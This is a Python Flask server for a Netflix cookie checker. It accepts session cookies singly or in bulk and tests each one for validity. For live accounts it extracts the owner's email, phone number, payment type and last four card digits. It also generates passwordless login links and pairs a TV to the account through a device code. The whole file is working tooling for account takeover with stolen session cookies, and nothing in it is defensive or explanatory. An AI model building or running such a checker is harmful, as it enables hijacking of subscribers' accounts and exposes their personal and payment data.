from flask import Flask, request, jsonify, render_template, Response
from flask_cors import CORS
import json
import queue
import os
import threading
from concurrent.futures import ThreadPoolExecutor

# Import core logic from main.py
from main import (
    _parse_cookie_input,
    check_account_info,
    check_country,
    generate_nftoken,
    tv_login_with_code,
    fetch_extra_account_info,
    CURRENCY_MAP,
)

app = Flask(__name__)
CORS(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max upload


# ══════════════════════════════════════════════════════════════════════
#  Core Processing Helper
# ══════════════════════════════════════════════════════════════════════

def process_cookie(cookie_input, generate_token=True):
    """Process a single cookie and return a comprehensive result dict.
    Mirrors the logic in main.py's process_one() but returns JSON-friendly data.
    """
    netflix_id, secure_id, extras = _parse_cookie_input(cookie_input)

    if not netflix_id:
        return {'status': 'ERROR', 'error': 'Could not parse NetflixId from input'}

    # Step 1: Account info
    info, collected_cookies = check_account_info(netflix_id, secure_id, extra_cookies=extras)

    base_cookie_dict = {'NetflixId': netflix_id}
    if secure_id:
        base_cookie_dict['SecureNetflixId'] = secure_id
    base_cookie_dict.update(extras)

    if info['status'] != 'LIVE':
        return info

    # Step 2: Country
    country = check_country(netflix_id, secure_id)

    # Step 3: Build full cookie dict
    cookie_dict = dict(base_cookie_dict)
    cookie_dict.update(collected_cookies)

    # Step 3.5: Extra info from /browse when fields are incomplete
    current_profiles = (
        [p.strip() for p in (info.get("profiles") or "").split(",") if p.strip()]
        if info.get("profiles") not in ("-", "") else []
    )
    current_num_profiles = int(info.get("numProfiles", 0) or 0)
    need_extra = (
        info.get("email") == "-" or
        info.get("owner") == "-" or
        info.get("profiles") == "-" or
        info.get("authURL") == "-" or
        current_num_profiles == 0 or
        current_num_profiles <= 1 or
        len(current_profiles) <= 1
    )
    if need_extra:
        try:
            extra = fetch_extra_account_info(cookie_dict)
            for key in ("email", "owner", "profiles", "country",
                        "membershipStatus", "authURL", "numProfiles"):
                if info.get(key, "-") == "-" and extra.get(key):
                    info[key] = extra[key]
                elif key == "numProfiles" and info.get(key, 0) == 0 and extra.get(key):
                    info[key] = extra[key]

            if extra.get("profiles"):
                extra_profiles = [p.strip() for p in extra["profiles"].split(",") if p.strip()]
                cur_p = (
                    [p.strip() for p in info.get("profiles", "-").split(",") if p.strip()]
                    if info.get("profiles") not in ("-", "") else []
                )
                if info.get("profiles") in ("-", "") or len(extra_profiles) > len(cur_p):
                    info["profiles"] = extra["profiles"]

            if extra.get("numProfiles"):
                info["numProfiles"] = max(
                    int(info.get("numProfiles", 0) or 0),
                    int(extra["numProfiles"])
                )

            if info.get("numProfiles", 0) == 0 and extra.get("profiles"):
                info["numProfiles"] = len(
                    [p.strip() for p in extra["profiles"].split(",") if p.strip()]
                )
        except Exception:
            pass

    # Update country if available from extra info
    if country in ("Unknown", "-") and info.get("country") not in ("-", "Unknown"):
        country = info["country"]

    # Step 4: NFToken
    token = None
    token_error = None
    if generate_token:
        token, token_error = generate_nftoken(cookie_dict)

    currency = CURRENCY_MAP.get(country, '?')
    membership = info.get('membershipStatus', '-')
    status_display = 'Active' if membership in ('CURRENT_MEMBER', '-', '') else membership

    return {
        'status': 'LIVE',
        'statusDisplay': status_display,
        'plan': info.get('plan', '-'),
        'price': info.get('price', '-'),
        'billing': info.get('billing', '-'),
        'videoQuality': info.get('videoQuality', '-'),
        'maxStreams': info.get('maxStreams', '-'),
        'paymentType': info.get('paymentType', '-'),
        'last4': info.get('last4', '-'),
        'memberSince': info.get('memberSince', '-'),
        'country': country,
        'currency': currency,
        'owner': info.get('owner', '-'),
        'email': info.get('email', '-'),
        'phone': info.get('phone', '-'),
        'membershipStatus': membership,
        'profiles': info.get('profiles', '-'),
        'numProfiles': info.get('numProfiles', 0),
        'numKidsProfiles': info.get('numKidsProfiles', 0),
        'extraMembers': info.get('extraMembers', False),
        'nftoken': token,
        'nftoken_error': token_error,
        'login_link': f'https://netflix.com/?nftoken={token}' if token else None,
        'authURL': info.get('authURL', '-'),
    }


# ══════════════════════════════════════════════════════════════════════
#  Routes
# ══════════════════════════════════════════════════════════════════════

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/check-single', methods=['POST'])
def api_check_single():
    data = request.get_json()
    if not data or not data.get('cookie'):
        return jsonify({'status': 'ERROR', 'error': 'Cookie input is required'}), 400

    result = process_cookie(data['cookie'].strip())
    return jsonify(result)


@app.route('/api/check-bulk', methods=['POST'])
def api_check_bulk():
    files = request.files.getlist('files')
    if not files:
        return jsonify({'error': 'No files uploaded'}), 400

    # Each file = 1 cookie (entire file content)
    cookies = []
    for f in files:
        content = f.read().decode('utf-8', errors='replace').strip()
        if content:
            cookies.append(content)

    if not cookies:
        return jsonify({'error': 'All files are empty'}), 400

    total = len(cookies)
    result_queue = queue.Queue()

    def worker(index, line):
        try:
            result = process_cookie(line)
            result_queue.put({'index': index, 'result': result})
        except Exception as e:
            result_queue.put({
                'index': index,
                'result': {'status': 'ERROR', 'error': str(e)}
            })

    def generate():
        yield f"data: {json.dumps({'type': 'start', 'total': total})}\n\n"

        # Kích hoạt Đa Luồng (Multi-threading) 10 công nhân chạy song song
        # Do session đã được cách ly tuyệt đối, không còn lo lây lan lỗi
        workers = min(10, total)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for i, line in enumerate(cookies):
                executor.submit(worker, i, line)

            checked = 0
            live_count = 0
            dead_count = 0
            error_count = 0

            while checked < total:
                try:
                    item = result_queue.get(timeout=120)
                    checked += 1

                    status = item['result'].get('status', 'ERROR')
                    if status == 'LIVE':
                        live_count += 1
                    elif status == 'DEAD':
                        dead_count += 1
                    else:
                        error_count += 1

                    event_data = {
                        'type': 'result',
                        'checked': checked,
                        'total': total,
                        'live': live_count,
                        'dead': dead_count,
                        'error': error_count,
                        'index': item['index'],
                        'result': item['result'],
                    }
                    yield f"data: {json.dumps(event_data)}\n\n"
                except queue.Empty:
                    yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"

        summary = {
            'type': 'complete',
            'total': total,
            'live': live_count,
            'dead': dead_count,
            'error': error_count,
        }
        yield f"data: {json.dumps(summary)}\n\n"

    return Response(
        generate(),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no',
            'Connection': 'keep-alive',
        }
    )


@app.route('/api/tv-login', methods=['POST'])
def api_tv_login():
    data = request.get_json()
    if not data:
        return jsonify({'status': 'ERROR', 'error': 'Request body is required'}), 400

    cookie_input = data.get('cookie', '').strip()
    tv_code = data.get('tv_code', '').strip()

    if not cookie_input or not tv_code:
        return jsonify({'status': 'ERROR', 'error': 'Cookie and TV code are required'}), 400

    netflix_id, secure_id, extras = _parse_cookie_input(cookie_input)
    if not netflix_id:
        return jsonify({'status': 'ERROR', 'error': 'Could not parse NetflixId'}), 400

    # Check account to get authURL
    info, collected_cookies = check_account_info(netflix_id, secure_id, extra_cookies=extras)

    if info.get('status') != 'LIVE':
        return jsonify({
            'status': 'ERROR',
            'error': f'Cookie is {info.get("status", "invalid")}. {info.get("error", "")}'.strip()
        })

    cookie_dict = {'NetflixId': netflix_id}
    if secure_id:
        cookie_dict['SecureNetflixId'] = secure_id
    cookie_dict.update(extras)
    cookie_dict.update(collected_cookies)

    auth_url = info.get('authURL')

    # Retry to get authURL if missing
    if (not auth_url or auth_url == '-') and (
        'SecureNetflixId' in collected_cookies or 'nfvdid' in collected_cookies
    ):
        extra_c = {
            k: v for k, v in collected_cookies.items()
            if k in ('SecureNetflixId', 'nfvdid')
        }
        info2, collected_cookies2 = check_account_info(
            netflix_id, collected_cookies.get('SecureNetflixId'), extra_cookies=extra_c
        )
        if info2.get('authURL') and info2['authURL'] != '-':
            auth_url = info2['authURL']
            cookie_dict.update(collected_cookies2)

    if not auth_url or auth_url == '-':
        return jsonify({
            'status': 'ERROR',
            'error': 'authURL not found. Include SecureNetflixId and nfvdid in cookie.'
        })

    ok, msg = tv_login_with_code(auth_url, tv_code, cookie_dict)

    country = info.get('country', '-')
    if country == '-':
        country = check_country(netflix_id, secure_id)

    return jsonify({
        'status': 'SUCCESS' if ok else 'FAILED',
        'message': msg,
        'account': {
            'owner': info.get('owner', '-'),
            'plan': info.get('plan', '-'),
            'country': country,
            'email': info.get('email', '-'),
        }
    })


# ══════════════════════════════════════════════════════════════════════
#  Entry Point
# ══════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
